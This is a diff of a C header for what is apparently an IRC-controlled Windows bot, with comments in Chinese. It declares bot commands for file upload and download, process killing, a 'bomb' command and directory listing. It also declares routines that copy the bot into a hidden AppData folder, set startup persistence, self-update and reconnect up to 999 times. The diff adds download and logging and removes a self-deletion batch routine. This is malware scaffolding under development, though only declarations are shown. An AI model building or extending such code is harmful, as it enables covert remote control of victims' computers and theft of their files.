@@ -13,6 +13,8 @@
 #include <shlobj.h>
 #include <wincrypt.h>
 #include <malloc.h>
+#include <time.h>
+#include <stdarg.h>
 
 #pragma comment(lib, "Ws2_32.lib")
 #pragma comment(lib, "crypt32.lib")
@@ -23,10 +25,11 @@
 // Constants
 #define DEFAULT_BUFLEN 4096
 #define MAX_SEND_LENGTH 400  // 最大发送长度（接近但不超过IRC限制）
-#define SEND_INTERVAL 500    // 发送间隔（毫秒）
+#define SEND_INTERVAL 1000    // 发送间隔（毫秒）
 #define MAX_RECONNECT_ATTEMPTS 999
 #define RECONNECT_INTERVAL 5000 // 单位：毫秒
 #define LONG_SLEEP_INTERVAL 1000*60*60*1 // 1小时
+#define MAX_PATH_LEN 512
 
 
 // 隐藏文件夹路径
@@ -37,9 +40,11 @@
 
 #define DEBUG 0
 #define HIDE_ON_ENTRY 1
+//#define FILE_ATTR_HIDDEN
 
 
 extern HANDLE hMutex;
+
 
 typedef enum
 {
@@ -49,6 +54,7 @@ typedef enum
     CMD_GETUPTIME,
     CMD_SETSTARTUP,
     CMD_FILE_UPLOAD,
+    CMD_FILE_DOWNLOAD,
     CMD_KILL_PROCESS,
     CMD_BOMB,
     CMD_LS,
@@ -75,12 +81,18 @@ typedef struct {
 } MessageBuffer;
 
 
+extern MessageBuffer msgBuffer;
+extern SOCKET ircsock;
+
+//file.c
+int handle_file_upload(ParsedCommand cmd);
+int handle_file_download(ParsedCommand cmd);
+BYTE* base64_decode(const char* input, DWORD in_len, DWORD* out_len);
 
 
 //function.cpp
-BYTE* base64_decode(const char* input, DWORD in_len, DWORD* out_len);
-int handle_file_upload(ParsedCommand cmd);
-int run_executable(const char* path, int mode);//show normal by default 
+
+int run_executable(const char* path, const char* args, int mode);
 char* list_directory(const char* path);
 char* pwd_command();
 char* cd_command(const char* path);
@@ -111,11 +123,7 @@ int copy_and_hide_bot();
 int is_hidden_bot();
 void get_appdata_path(wchar_t* path, size_t len);
 int create_hidden_directory(const wchar_t* path);
-int delete_self_with_batch();
 
-//compress.c
-int compress_with_powershell(const char* source_dir, const char* output_zip);
-int decompress_with_powershell(const char* zip_file, const char* dest_dir);
 
 
 //update_exe.c
@@ -123,5 +131,19 @@ int update_exe(char* path);
 
 //hash.c
 int compute_sha256(const BYTE* data, size_t len, char output[65]);
+
+
+//log.c
+
+extern char log_path[MAX_PATH_LEN];
+extern char appdata_path[MAX_PATH_LEN];
+void bot_log(const char* format, ...);
+void init_log_path();
+
+//unicode.c
+int UnicodeToAnsi(const wchar_t* unicodeStr, char* ansiStr, int bufferSize);
+int AnsiToUnicode(const char* ansiStr, wchar_t* unicodeStr, int bufferSize);
+int Utf8ToAnsi(const char* utf8Str, char* ansiStr, int bufferSize);
+int AnsiToUtf8(const char* ansiStr, char* utf8Str, int bufferSize);
   
 #endif
